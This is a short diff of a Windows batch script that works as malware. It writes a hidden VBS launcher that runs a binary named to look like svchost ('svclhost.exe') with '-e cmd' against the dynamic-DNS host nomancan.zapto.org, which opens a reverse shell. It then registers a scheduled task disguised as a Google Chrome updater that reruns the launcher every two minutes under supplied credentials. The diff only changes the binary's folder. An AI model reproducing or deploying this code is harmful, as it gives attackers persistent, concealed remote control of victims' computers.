@@ -25,7 +25,7 @@ echo %uname%
 echo %pass%
 echo %n_pt%
 
-echo CreateObject("Wscript.Shell").Run "cmd /c C:\Windows\addins\svclhost.exe nomancan.zapto.org %n_pt% -e cmd", 0, True > "C:\Windows\Temp\newsvclhost.vbs"
+echo CreateObject("Wscript.Shell").Run "cmd /c C:\Windows\Temp\svclhost.exe nomancan.zapto.org %n_pt% -e cmd", 0, True > "C:\Windows\Temp\newsvclhost.vbs"
 
 set tt=%time:~0,5%
 SCHTASKS /CREATE /SC MINUTE /MO 2 /TN "GoogleSystem\GoogleUpdater\ChromeOnline" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\newsvclhost.vbs" /ST %tt% /RU %uname% /RP %pass% /F
